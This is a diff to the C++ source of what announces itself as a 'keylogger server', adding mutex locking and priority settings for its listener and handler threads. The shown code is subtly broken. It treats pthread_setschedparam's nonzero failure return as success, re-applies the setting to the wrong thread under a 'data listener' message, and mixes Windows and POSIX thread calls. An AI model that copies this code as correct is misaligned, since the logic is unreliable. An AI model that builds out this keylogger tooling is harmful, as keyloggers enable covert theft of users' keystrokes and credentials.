@@ -19,6 +19,9 @@ void Listener()
     (head->target)=0x00;
     SYSTEMTIME timestamp;
 
+    WaitForSingleObject(mu,INFINITE);
+    ReleaseMutex(mu);
+
     int cL;
     fprintf(stderr ,"Welcome to the keylogger server version 0.1.0, \n momentarily the listener should be established!\n");
     fprintf(stderr ,"\t[*] Initalizing socket...\n");
@@ -169,9 +172,24 @@ void Handler()
 */
 int main()
 {
+
     mu = CreateMutex(NULL,false,NULL);
+
+    WaitForSingleObject(mu,INFINITE);
+    sched_param sch_params;
+    sch_params.sched_priority =THREAD_PRIORITY_HIGHEST;
     std::thread thread1 (Listener);
+    if(pthread_setschedparam(thread1.native_handle(),SCHED_RR,&sch_params))
+    {
+        printf("[*] priority of connection listener increased successfully!\n");
+    }
     std::thread thread2 (Handler);
+    pthread_setschedparam(thread2.native_handle(),SCHED_RR,&sch_params);
+        if(pthread_setschedparam(thread1.native_handle(),SCHED_RR,&sch_params))
+    {
+        printf("[*] priority of data listener increased successfully!\n");
+    }
+    ReleaseMutex(mu);
     thread1.join();
     exit(-1);
 
